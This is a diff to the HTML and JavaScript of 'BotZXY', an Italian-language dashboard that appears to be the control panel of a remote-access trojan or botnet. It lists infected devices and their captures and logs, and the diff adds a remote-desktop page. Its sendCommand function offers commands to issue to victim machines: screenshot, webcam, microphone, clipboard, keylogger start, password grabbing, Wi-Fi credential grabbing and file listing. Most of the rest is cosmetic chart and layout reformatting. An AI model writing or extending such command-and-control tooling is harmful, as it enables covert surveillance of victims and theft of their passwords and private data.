@@ -125,20 +125,17 @@
         };
         const t = themes[savedTheme] || themes['dark'];
         
-        // Applica variabili CSS
         document.documentElement.style.setProperty('--bg-primary', t.bg);
         document.documentElement.style.setProperty('--text-primary', t.text);
         document.documentElement.style.setProperty('--bg-card', t.card);
         document.documentElement.style.setProperty('--border-color', t.border);
         
-        // Applica al body (solo se esiste)
         if (document.body) {
             document.body.style.background = t.bg;
             document.body.style.color = t.text;
             document.body.className = 'theme-' + savedTheme;
         }
         
-        // Applica agli elementi esistenti (solo se esistono)
         const selectors = ['.card', '.settings-card', '.stat-card', '.device-card', '.capture-item', '.stat-box', '.chart-card', '.table-card', '.sidebar'];
         selectors.forEach(function(selector) {
             document.querySelectorAll(selector).forEach(function(el) {
@@ -160,14 +157,15 @@
     <aside class="sidebar" id="sidebar">
         <div class="logo"><i class="fas fa-robot"></i> Bot<span>ZXY</span></div>
         <nav class="nav">
-    <a href="/dashboard" data-i18n="dashboard"><i class="fas fa-tachometer-alt"></i> Dashboard</a>
-    <a href="/devices" data-i18n="devices"><i class="fas fa-mobile-alt"></i> Devices <span class="badge-nav" id="deviceBadge">0</span></a>
-    <a href="/captures" data-i18n="captures"><i class="fas fa-camera"></i> Captures <span class="badge-nav" id="captureBadge">0</span></a>
-    <a href="/analytics" data-i18n="analytics"><i class="fas fa-chart-pie"></i> Analytics</a>
-    <a href="/logs" data-i18n="logs"><i class="fas fa-history"></i> Logs</a>
-    <a href="/settings" data-i18n="settings"><i class="fas fa-cog"></i> Settings</a>
-    <a href="/logout" data-i18n="logout"><i class="fas fa-sign-out-alt"></i> Logout</a>
-</nav>
+            <a href="/dashboard" data-i18n="dashboard" class="active"><i class="fas fa-tachometer-alt"></i> Dashboard</a>
+            <a href="/devices" data-i18n="devices"><i class="fas fa-mobile-alt"></i> Devices <span class="badge-nav" id="deviceBadge">0</span></a>
+            <a href="/captures" data-i18n="captures"><i class="fas fa-camera"></i> Captures <span class="badge-nav" id="captureBadge">0</span></a>
+            <a href="/analytics" data-i18n="analytics"><i class="fas fa-chart-pie"></i> Analytics</a>
+            <a href="/logs" data-i18n="logs"><i class="fas fa-history"></i> Logs</a>
+            <a href="/remote" data-i18n="remote"><i class="fas fa-desktop"></i> Remote</a>
+            <a href="/settings" data-i18n="settings"><i class="fas fa-cog"></i> Settings</a>
+            <a href="/logout" data-i18n="logout"><i class="fas fa-sign-out-alt"></i> Logout</a>
+        </nav>
         <div class="footer-sidebar"><span class="status-dot"></span> <span data-i18n="system_active">Sistema attivo</span> · <span id="footerTime"></span></div>
     </aside>
 
@@ -252,145 +250,77 @@
         }
 
         function refreshCharts() {
-    fetch('/api/chart/activity')
-        .then(function(res) { return res.json(); })
-        .then(function(data) {
-            var ctx = document.getElementById('activityChart').getContext('2d');
-            if (activityChart) activityChart.destroy();
-
-            activityChart = new Chart(ctx, {
-                type: 'line',
-                data: {
-                    labels: data.labels || [],
-                    datasets: [{
-                        label: 'Dispositivi attivi',  // <-- TESTO SENZA HTML
-                        data: data.data || [],
-                        borderColor: '#8b5cf6',
-                        backgroundColor: 'rgba(139,92,246,0.06)',
-                        fill: true,
-                        tension: 0.4,
-                        pointRadius: 2,
-                        pointBackgroundColor: '#8b5cf6',
-                        borderWidth: 2
-                    }]
-                },
-                options: {
-                    responsive: true,
-                    maintainAspectRatio: true,
-                    plugins: {
-                        legend: {
-                            labels: {
-                                color: 'rgba(255,255,255,0.3)',
-                                font: { size: 9 }
-                            }
-                        }
-                    },
-                    scales: {
-                        x: {
-                            ticks: {
-                                color: 'rgba(255,255,255,0.12)',
-                                font: { size: 8 },
-                                maxTicksLimit: 12
-                            },
-                            grid: { color: 'rgba(255,255,255,0.02)' }
+            fetch('/api/chart/activity')
+                .then(function(res) { return res.json(); })
+                .then(function(data) {
+                    var ctx = document.getElementById('activityChart').getContext('2d');
+                    if (activityChart) activityChart.destroy();
+                    activityChart = new Chart(ctx, {
+                        type: 'line',
+                        data: {
+                            labels: data.labels || [],
+                            datasets: [{
+                                label: 'Dispositivi attivi',
+                                data: data.data || [],
+                                borderColor: '#8b5cf6',
+                                backgroundColor: 'rgba(139,92,246,0.06)',
+                                fill: true,
+                                tension: 0.4,
+                                pointRadius: 2,
+                                pointBackgroundColor: '#8b5cf6',
+                                borderWidth: 2
+                            }]
                         },
-                        y: {
-                            ticks: {
-                                color: 'rgba(255,255,255,0.12)',
-                                font: { size: 8 },
-                                stepSize: 1
+                        options: {
+                            responsive: true,
+                            maintainAspectRatio: true,
+                            plugins: {
+                                legend: { labels: { color: 'rgba(255,255,255,0.3)', font: { size: 9 } } }
                             },
-                            grid: { color: 'rgba(255,255,255,0.02)' }
-                        }
-                    }
-                }
-            });
-        })
-        .catch(function(err) {
-            console.error('Activity chart error:', err);
-        });
-
-    fetch('/api/chart/platforms')
-        .then(function(res) { return res.json(); })
-        .then(function(data) {
-            var ctx2 = document.getElementById('platformChart').getContext('2d');
-            if (platformChart) platformChart.destroy();
-
-            platformChart = new Chart(ctx2, {
-                type: 'doughnut',
-                data: {
-                    labels: data.labels || ['Nessun dato'],
-                    datasets: [{
-                        data: data.data || [1],
-                        backgroundColor: data.colors || ['rgba(255,255,255,0.05)'],
-                        borderColor: 'transparent'
-                    }]
-                },
-                options: {
-                    responsive: true,
-                    maintainAspectRatio: true,
-                    plugins: {
-                        legend: {
-                            position: 'bottom',
-                            labels: {
-                                color: 'rgba(255,255,255,0.3)',
-                                font: { size: 9 },
-                                padding: 8
+                            scales: {
+                                x: { ticks: { color: 'rgba(255,255,255,0.12)', font: { size: 8 }, maxTicksLimit: 12 }, grid: { color: 'rgba(255,255,255,0.02)' } },
+                                y: { ticks: { color: 'rgba(255,255,255,0.12)', font: { size: 8 }, stepSize: 1 }, grid: { color: 'rgba(255,255,255,0.02)' } }
                             }
                         }
-                    },
-                    cutout: '70%'
-                }
-            });
-        })
-        .catch(function(err) {
-            console.error('Platform chart error:', err);
-        });
-}
+                    });
+                });
+
+            fetch('/api/chart/platforms')
+                .then(function(res) { return res.json(); })
+                .then(function(data) {
+                    var ctx2 = document.getElementById('platformChart').getContext('2d');
+                    if (platformChart) platformChart.destroy();
+                    platformChart = new Chart(ctx2, {
+                        type: 'doughnut',
+                        data: {
+                            labels: data.labels || ['Nessun dato'],
+                            datasets: [{
+                                data: data.data || [1],
+                                backgroundColor: data.colors || ['rgba(255,255,255,0.05)'],
+                                borderColor: 'transparent'
+                            }]
+                        },
+                        options: {
+                            responsive: true,
+                            maintainAspectRatio: true,
+                            plugins: {
+                                legend: { position: 'bottom', labels: { color: 'rgba(255,255,255,0.3)', font: { size: 9 }, padding: 8 } }
+                            },
+                            cutout: '70%'
+                        }
+                    });
+                });
+        }
 
         function sendCommand(id) { const cmd=prompt('📡 Invia comando a '+id.substring(0,8)+'...\n\nscreenshot\nwebcam\nmic\nclipboard\nkeylogger_start\ngrab_passwords\ngrab_wifi\nlist_files C:\\','screenshot'); if(cmd){ fetch(`/api/command/${id}`,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({command:cmd,params:''})}).then(()=>alert('✅ Comando inviato')).catch(()=>alert('❌ Errore')); } }
         function viewDevice(id) { alert('👁️ Dettagli dispositivo: '+id); }
         function removeDevice(id) {
-    if (!id) {
-        alert('❌ ID dispositivo non valido');
-        return;
-    }
-    
-    if (confirm('⚠️ Rimuovere il dispositivo ' + id.substring(0, 8) + '...?\n\n' +
-                'Verranno eliminati:\n' +
-                '• Il dispositivo\n' +
-                '• Tutte le catture associate\n' +
-                '• Tutti i comandi associati\n' +
-                '• Tutti i log associati\n\n' +
-                'Questa operazione è irreversibile!')) {
-        
-        fetch('/api/device/' + id, {
-            method: 'DELETE',
-            headers: {
-                'Content-Type': 'application/json'
-            }
-        })
-        .then(function(res) {
-            if (!res.ok) {
-                return res.json().then(function(data) {
-                    throw new Error(data.error || 'Errore sconosciuto');
-                });
-            }
-            return res.json();
-        })
-        .then(function(data) {
-            if (data.status === 'deleted') {
-                alert('✅ Dispositivo rimosso con successo!');
-                refreshDevices();
-                refreshStats();
-            } else {
-                alert('❌ Errore: ' + (data.error || 'Operazione fallita'));
-            }
-        })
-        .catch(function(err) {
-            console.error('Errore eliminazione:', err);
-            alert('❌ Errore: ' + err.message);
-        });
+    if (!id) { alert('❌ ID dispositivo non valido'); return; }
+    if (confirm('⚠️ Rimuovere il dispositivo ' + id.substring(0, 8) + '...?\n\nVerranno eliminati:\n• Il dispositivo\n• Tutte le catture associate\n• Tutti i comandi associati\n• Tutti i log associati\n\nQuesta operazione è irreversibile!')) {
+        fetch('/api/device/' + id, { method: 'DELETE', headers: { 'Content-Type': 'application/json' } })
+        .then(function(res) { if (!res.ok) { return res.json().then(function(data) { throw new Error(data.error || 'Errore sconosciuto'); }); } return res.json(); })
+        .then(function(data) { if (data.status === 'deleted') { alert('✅ Dispositivo rimosso con successo!'); refreshDevices(); refreshStats(); } else { alert('❌ Errore: ' + (data.error || 'Operazione fallita')); } })
+        .catch(function(err) { console.error('Errore eliminazione:', err); alert('❌ Errore: ' + err.message); });
     }
 }
 
@@ -399,9 +329,3 @@
     </script>
 </body>
 </html>
-
-
-
-
-
-
